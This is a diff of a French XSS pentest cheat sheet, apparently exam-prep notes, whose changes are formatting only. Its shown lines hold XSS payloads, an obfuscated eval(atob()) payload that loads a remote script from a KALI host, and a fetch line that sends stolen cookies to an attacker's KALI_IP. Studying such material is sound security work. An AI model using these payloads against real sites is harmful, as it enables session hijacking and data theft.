@@ -37,10 +37,10 @@ Injecter un **canary** (mot unique traçable) dans chaque paramètre, puis inspe
 canary123
 ```
 
-Observer :
-- Dans un attribut HTML → `<input value="canary123">` → tenter de fermer l'attribut
-- Dans un tag `<script>` → `var x = "canary123"` → injection JS directe
-- Encodé en HTML `&lt;` → filtre présent, tenter un autre vecteur
+Observer :  
+- Dans un attribut HTML → `<input value="canary123">` → tenter de fermer l'attribut  
+- Dans un tag `<script>` → `var x = "canary123"` → injection JS directe  
+- Encodé en HTML `&lt;` → filtre présent, tenter un autre vecteur  
 
 ### 2.4 Fuzzing avec wfuzz
 
@@ -75,7 +75,7 @@ wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/human-friendly/XSS-BruteLogic.t
 ### 3.3 Injection dans JavaScript existant
 
 ```javascript
-# Si : var x = "INJECTION"
+// Si : var x = "INJECTION"
 ";alert(1);//
 '+alert(1)+'
 '-alert(1)-'
@@ -84,7 +84,7 @@ wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/human-friendly/XSS-BruteLogic.t
 ### 3.4 Injection via innerHTML (DOM XSS)
 
 ```javascript
-# <script> bloqué dans innerHTML → utiliser event handler
+// <script> bloqué dans innerHTML → utiliser event handler
 <img src=x onerror=alert(1)>
 <svg onload=alert(1)>
 ```
@@ -92,13 +92,13 @@ wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/human-friendly/XSS-BruteLogic.t
 ### 3.5 Base64 + eval (bypass filtres)
 
 ```javascript
-# Encoder le payload en Base64 (dans Burp Decoder)
+// Encoder le payload en Base64 (dans Burp Decoder)
 eval(atob('YWxlcnQoMSk='))
 
-# Avec jQuery.getScript() si jQuery disponible
+// Avec jQuery.getScript() si jQuery disponible
 '+eval(atob('alF1ZXJ5LmdldFNjcmlwdCgnaHR0cDovL0tBTEkvdHNzLmpzJyk='))+'
 
-# Wrapper btoa() pour éviter erreurs dans l'URL
+// Wrapper btoa() pour éviter erreurs dans l'URL
 '+btoa(eval(atob('PAYLOAD_B64')))+'
 ```
 
@@ -138,8 +138,8 @@ fetch("http://KALI_IP/exfil?data=" + encodedCookie)
 ```
 
 !!! warning "HttpOnly"
-Si le cookie est HttpOnly, `document.cookie` retourne vide.
-**Chercher d'autres secrets** : localStorage, sessionStorage, DOM.
+  Si le cookie est HttpOnly, `document.cookie` retourne vide.
+  **Chercher d'autres secrets** : localStorage, sessionStorage, DOM.
 
 ---
 
@@ -284,6 +284,6 @@ http://TARGET/app/?csv=NOUVEAU_BASE64
 ```
 
 !!! tip "Astuce exam"
-Si `<script>` est bloqué → tester `<img src=x onerror=...>`  
-Si `"` est encodé → tenter `'` ou sans guillemets  
-Si le filtre bloque `alert` → tester `confirm(1)` ou `prompt(1)`
+  Si `<script>` est bloqué → tester `<img src=x onerror=...>`  
+  Si `"` est encodé → tenter `'` ou sans guillemets  
+  Si le filtre bloque `alert` → tester `confirm(1)` ou `prompt(1)`
